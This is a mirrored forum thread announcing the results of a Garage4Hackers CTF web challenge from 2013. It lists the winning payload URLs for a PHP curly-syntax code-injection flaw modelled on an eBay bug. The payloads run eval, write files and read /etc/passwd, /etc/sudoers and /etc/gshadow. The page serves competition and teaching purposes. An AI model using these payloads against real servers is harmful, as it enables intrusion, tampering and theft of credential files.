@@ -1,0 +1,273 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=5511&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 15:20:04 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> Garage4Hackers CTF Web Level 1 challenge result</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthread1be1.html?t=5511">Garage4Hackers CTF Web Level 1 challenge result</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">12-27-2013, 05:26 PM</div>
+		<span class="username">[s]</span>
+	</div>
+	
+	
+		<div class="title">Garage4Hackers CTF Web Level 1 challenge result</div>
+	
+	<div class="content">
+		<blockquote class="restore">The Garage4Hackers CTF level 1 challenge came to life on 25th December, 2013 at 10:30 PM IST.  It saw nice participation from across the globe with some really creative attempts to crack the challenge. It took us some serious judging to filter out the top attempts. Finally we are done with it. And now we are pleased to announce the results of our Level 1 challenge !!<br />
+<br />
+<b>The Challenge was 54.197.234.66/index.php?wish=hohohoSanta :</b><br />
+<br />
+To try to execute simple PHP code or pwn the server and try to update the 54.197.234.66/updateme.txt. <br />
+<br />
+Also,<br />
+<br />
+safemode=on<br />
+<br />
+List of disabled functions:<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">dl,exec, passthru, shell_exec, system, proc_open, popen ,curl_exec, curl_multi_exec , parse_ini_file, show_source, url_exec, syslog, pcntl_alarm, pcntl_fork, pcntl_waitpid, pcntl_wait, pcntl_wifexited, pcntl_wifstopped, pcntl_wifsignaled ,pcntl_wexitstatus, pcntl_wtermsig, pcntl_wstopsig, pcntl_signal, pcntl_signal_dispatch, pcntl_get_last_error, pcntl_strerror, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_exec, pcntl_getpriority, pcntl_setpriority, allow_url_fopen, allow_url_include, stream_select</code><hr />
+</div><div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">expose_php = Off<br />
+display_errors = Off<br />
+track_errors = Off<br />
+html_errors = Off</code><hr />
+</div><b>Vulnerability Description : </b><br />
+<br />
+I would like to give special thanks to David Vieira-Kurz(@secalert) for finding this awesome bug on Ebay. This kind of vulnerability was less known until lately when it shot to limelight (<a href="../external.html?link=http://www.secalert.net/2013/12/13/ebay-remote-code-execution/" target="_blank">http://www.secalert.net/2013/12/13/e...ode-execution/</a>) . We decided to make Level 1 challenge based on this vulnerability and tried to emulate the same flaw as in the case of eBay. For more details on the vulnerability check following blogs. <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">http://www.secalert.net/2013/12/13/ebay-remote-code-execution/<br />
+http://gynvael.coldwind.pl/n/ebay_rce_analysis_wrong_question_mark</code><hr />
+</div><br />
+<b>Submissions from approximately 400 participants </b><br />
+<br />
+We saw approximately 400 individual participants looking to grab the prize. Payload attempts ranged from the blunt nessus scanners to really cool &#8220;insert the coolest attack here &#8221;attacks. <br />
+We have decided to release the total apache log generated during the challenge. <b>You can download it by emailing us</b>. Top submissions are based on best payload and then 1st come 1st out basis in case of same payload.<br />
+<br />
+<b>Top submissions</b><br />
+<br />
+<br />
+<b>1. Xelenonz Lp. </b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">http://54.197.234.66/index.php?wish[]=x<br />
+<br />
+http://54.197.234.66/index.php?wish={${phpinfo()}}<br />
+<br />
+&nbsp;http://54.197.234.66/index.php?wish={${highlight_file('./index.php')}}<br />
+<br />
+http://54.197.234.66/index.php?wish={${file_put_contents('updateme.txt','Xelenonz',FILE_APPEND)}};<br />
+<br />
+http://54.197.234.66/index.php?wish={${eval($_GET['code'])}}&amp;code=file_put_contents('updateme.txt','Xelenonz',FILE_APPEND);<br />
+<br />
+http://54.197.234.66/index.php?wish={${print_r(glob(&quot;/tmp/*&quot;))}}<br />
+<br />
+http://54.197.234.66/index.php?wish={${print_r(scandir($_GET['dir']))}}&amp;dir=/tmp</code><hr />
+</div><b>2. Pichaya Morimoto(LongCat) </b><br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">http://54.197.234.66/index.php?wish={${readfile('/tmp/lnz')}}<br />
+<br />
+http://54.197.234.66/index.php?wish={${include('/tmp/lnz')}}<br />
+<br />
+http://54.197.234.66/index.php?wish={${print_r(stat(&quot;updateme.txt&quot;))}}<br />
+<br />
+http://54.197.234.66/index.php?wish={${file_put_contents(&quot;/tmp/lnz&quot;,base64_decode(&quot;PD9waHAgcGhwaW5mbygpOyA/Pg==&quot;))}}<br />
+<br />
+http://54.197.234.66/index.php?wish=/index.php?wish={${read_file('index.php')}}</code><hr />
+</div><b>3. Mykola Ilin - solarwind [Defcon Ukraine]</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">http://54.197.234.66/index.php?wish=${include &quot;/proc/cpuinfo&quot;}<br />
+<br />
+http://54.197.234.66/index.php?wish=${include &quot;/etc/passwd&quot;}<br />
+<br />
+http://54.197.234.66/index.php?wish=${var_dump(glob(&quot;/proc/self/fd/*&quot;))}<br />
+<br />
+http://54.197.234.66/index.php?wish=${var_dump(glob(&quot;/etc/*&quot;))}<br />
+<br />
+http://54.197.234.66/index.php?/index.php?wish=${file_put_contents(&quot;updateme.txt&quot;,&quot;\\nsolarwind\\n&quot;,FILE_APPEND)}</code><hr />
+</div><b>4. Pedro [tunelko] </b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">http://54.197.234.66/index.php?wish=${var_dump(base64_decode('PD8gcGhwaW5mbygpOyBkaWUoKTs/Pg=='))}<br />
+<br />
+http://54.197.234.66/index.php?wish=${var_dump(file_get_contents('/etc/sudoers'))}<br />
+<br />
+http://54.197.234.66/index.php?wish=${var_dump(file_get_contents('/etc/gshadow'))}<br />
+<br />
+http://54.197.234.66/index.php?wish=${var_dump(ini_get('disable_functions'))}<br />
+<br />
+http://54.197.234.66/index.php?wish=${file_put_contents(&quot;updateme.txt&quot;,&quot;\nsolarwind\n&quot;,FILE_APPEND)}</code><hr />
+</div><b>5. Nishant </b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">54.197.234.66/index.php?wish={${phpinfo()}}<br />
+<br />
+54.197.234.66/index.php?wish={${file_put_contents('updateme.txt','nishant.dp@gmail.com at Thu, 26/12/2013 1:25AM IST')}}</code><hr />
+</div><b>6. Bharadwaj Machiraju</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">54.197.234.66/index.php?wish={${phpinfo()}}<br />
+<br />
+http://54.197.234.66/index.php?wish=${file_put_contents(&quot;updateme.txt&quot;, &quot;\ntunnelshade\n&quot;, FILE_APPEND)}</code><hr />
+</div><b>7. Rahul Mali</b><br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">54.197.234.66/index.php?wish={${phpinfo()}}<br />
+54.197.234.66/index.php?wish={${fwrite(fopen(&quot;updateme.txt&quot;,&quot;a&quot;),&quot;Rahul%20Mali%20(rahulmali31415@gmail.com)&quot;)}}</code><hr />
+</div><b>8. Piyush Pattanayak</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">54.197.234.66/index.php?wish={${phpinfo()}}<br />
+<br />
+54.197.234.66/index.php?wish=shoes({${file_put_contents('updateme.txt', 'Piyush Pattanayak', FILE_APPEND)}})</code><hr />
+</div>-------------------------------------------------------------------------<br />
+Note: Everyone tried execute PHP Curly Syntax as per our log information .However we can also execute the PHP code in the following way. <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">http://54.197.234.66/index.php?wish=%22%2bphpinfo%28%29%2b%22<br />
+http://54.197.234.66/index.php?wish=&quot;.phpinfo().&quot;</code><hr />
+</div>-------------------------------------------------------------------------<br />
+<br />
+<br />
+AND THE WINNERS ARE   <br />
+<br />
+<b>Xelenonz Lp. and Solarwind </b><br />
+<br />
+<a href="../dl.dropboxusercontent.com/u/18007092/L33t%20T-shit%20G4h.html" target="_blank">https://dl.dropboxusercontent.com/u/...shit%20G4h.jpg</a><br />
+<br />
+Special thanks all participant &amp; of course gear up for Level 2 :)<br />
+<br />
+Thank you !<br />
+[S]</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">12-27-2013, 07:50 PM</div>
+		<span class="username">ramicious</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">And I thought, I was the only one to use curly syntax.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_3">
+	<div class="header">
+		<div class="datetime">12-27-2013, 11:40 PM</div>
+		<span class="username">prakhar</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Congratulations everyone! Great and neat efforts :)</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_4">
+	<div class="header">
+		<div class="datetime">12-28-2013, 05:13 AM</div>
+		<span class="username">EgyptGhost</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Heartiest Congratulations for your achievement  Xelenonz Lp. and Solarwind  :)<br />
+Keep going</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_5">
+	<div class="header">
+		<div class="datetime">12-29-2013, 01:32 AM</div>
+		<span class="username">cool_paras</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Congratzz Winners...:)<br />
+<br />
+How to get to know that any <b>php </b>site has this kind of vulnerability???<br />
+<br />
+plz tell me</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_6">
+	<div class="header">
+		<div class="datetime">01-01-2014, 03:41 PM</div>
+		<span class="username">sniffer</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Congratulations everyone! :) :D</blockquote>
+	</div>
+</li>
+</ul>
+
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">04:41 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=5511&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 15:20:04 GMT -->
+</html>
